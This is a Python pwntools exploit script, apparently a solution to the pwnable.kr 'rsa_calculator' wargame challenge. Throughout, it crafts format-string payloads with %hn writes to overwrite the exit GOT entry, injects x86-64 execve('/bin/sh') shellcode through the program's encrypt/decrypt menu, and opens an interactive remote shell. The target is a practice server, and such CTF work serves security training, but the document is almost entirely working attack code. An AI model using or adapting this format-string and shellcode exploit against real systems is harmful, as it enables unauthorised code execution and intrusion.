#!/usr/bin/python
from pwn import *

#r = process ("./rsa_calculator")
r = remote ("pwnable.kr", 9012)

def get_c (h):
  return "%" + str(h) + "c"

def get_dn (h):
  return "%" + str(h) + "$hn"

def get_dx (h):
  return "%" + str(h) + "$llx"

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

exit_got = 0x602068

pay1 = "AAAAAAAA" + get_c(0x2130-8) + "%32$hn"
pay2 = "AAAAAAAA" + get_c(0x60-8) + "%30$hn"

r.sendline ("1")
r.sendline ("173\n149\n3\n16971")
# %12$llx
r.sendline ("2")
r.sendline ("1000")
r.sendline (pay1)
r.recvuntil ("encoded) -")
res = r.recvuntil ("- select").split ("- select")[0].replace ("\n","")

print res

r.sendline ("2")
r.sendline ("1000")
r.sendline (pay2)
r.recvuntil ("encoded) -")
res2 = r.recvuntil ("- select").split ("- select")[0].replace ("\n","")


enc1 = res + p64(exit_got) + "BBBB\x00\x00\x00\x00\x00\x00\x00\x00aaaa"#"BBBBBBBB"
#enc1 = res + "6820600000000000"
enc2 = res2 + p64(exit_got+2) + "90909090" + "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"

print len (enc1)
print len (enc2)

r.sendline ("3")
r.sendline ("1000")
r.sendline (enc1)

r.sendline ("3")
r.sendline ("1000")
r.sendline (enc2)

#r.sendline ("-4")
r.sendline ("5")

r.recvuntil ("bye")
r.sendline ("/bin/sh")
r.interactive ()
